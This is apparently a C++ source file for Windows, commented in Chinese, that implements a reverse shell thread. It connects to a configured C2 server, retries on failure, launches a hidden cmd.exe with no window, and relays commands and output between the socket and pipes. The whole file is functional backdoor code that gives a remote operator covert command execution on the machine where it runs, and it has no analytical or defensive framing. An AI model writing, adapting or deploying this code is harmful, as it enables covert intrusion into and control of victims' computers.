#include <ws2tcpip.h>
#include "client.h"


// 反向 Shell 线程函数
DWORD WINAPI ReverseShellThread(LPVOID lpParameter) {
    WSADATA wsaData;
    SOCKET sock;
    sockaddr_in server;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    HANDLE hReadPipe = NULL, hWritePipe = NULL;
    SECURITY_ATTRIBUTES sa;
    char buffer[BUFFER_SIZE];
    DWORD bytesRead, bytesWritten;

    // 初始化 Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    // 创建 socket
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // 配置服务器地址
    server.sin_family = AF_INET;
    server.sin_port = htons(C2_SERVER_PORT);
    inet_pton(AF_INET, C2_SERVER_IP, &server.sin_addr);

    // 连接到 C2 服务器（带重试机制）
    int retryCount = 0;
    const int maxRetries = 5;
    while (retryCount < maxRetries) {
        if (connect(sock, (sockaddr*)&server, sizeof(server)) == 0) {
            break;  // 连接成功
        }
        retryCount++;
        Sleep(3000);  // 等待 3 秒后重试
    }

    if (retryCount >= maxRetries) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // 发送初始化消息
    const char* initMsg = "[*] Reverse shell connected!\r\n";
    send(sock, initMsg, (int)strlen(initMsg), 0);

    // 设置安全属性，允许句柄继承
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    // 创建匿名管道用于进程通信
    HANDLE hStdInRead, hStdInWrite;
    HANDLE hStdOutRead, hStdOutWrite;

    if (!CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0)) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) {
        CloseHandle(hStdInRead);
        CloseHandle(hStdInWrite);
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // 设置子进程不继承写入端和读取端
    SetHandleInformation(hStdInWrite, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);

    // 启动 cmd.exe
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // 隐藏窗口
    si.hStdInput = hStdInRead;
    si.hStdOutput = hStdOutWrite;
    si.hStdError = hStdOutWrite;

    ZeroMemory(&pi, sizeof(pi));

    // 创建 cmd 进程
    if (!CreateProcessA(
        NULL,
        (LPSTR)"cmd.exe /K chcp 65001 >nul",  // 设置 UTF-8 代码页并隐藏输出
        NULL,
        NULL,
        TRUE,  // 继承句柄
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        CloseHandle(hStdInRead);
        CloseHandle(hStdInWrite);
        CloseHandle(hStdOutRead);
        CloseHandle(hStdOutWrite);
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // 关闭子进程端的句柄
    CloseHandle(hStdInRead);
    CloseHandle(hStdOutWrite);

    // 设置 socket 为非阻塞模式
    u_long mode = 1;
    ioctlsocket(sock, FIONBIO, &mode);

    // 主循环：在 socket 和管道之间传输数据
    while (true) {
        // 检查进程是否还在运行
        DWORD exitCode;
        if (GetExitCodeProcess(pi.hProcess, &exitCode) && exitCode != STILL_ACTIVE) {
            break;
        }

        // 从 socket 读取命令
        int recvResult = recv(sock, buffer, BUFFER_SIZE - 1, 0);
        if (recvResult > 0) {
            buffer[recvResult] = '\0';
            // 写入到 cmd 的标准输入
            WriteFile(hStdInWrite, buffer, recvResult, &bytesWritten, NULL);
        }
        else if (recvResult == 0) {
            // 连接关闭
            break;
        }

        // 从 cmd 的标准输出读取结果
        DWORD available = 0;
        if (PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &available, NULL) && available > 0) {
            if (available > BUFFER_SIZE) {
                available = BUFFER_SIZE;
            }
            if (ReadFile(hStdOutRead, buffer, available, &bytesRead, NULL) && bytesRead > 0) {
                // 发送到 socket
                send(sock, buffer, bytesRead, 0);
            }
        }

        Sleep(10);  // 短暂休眠，避免 CPU 占用过高
    }

    // 清理
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdInWrite);
    CloseHandle(hStdOutRead);
    closesocket(sock);
    WSACleanup();
    return 0;
}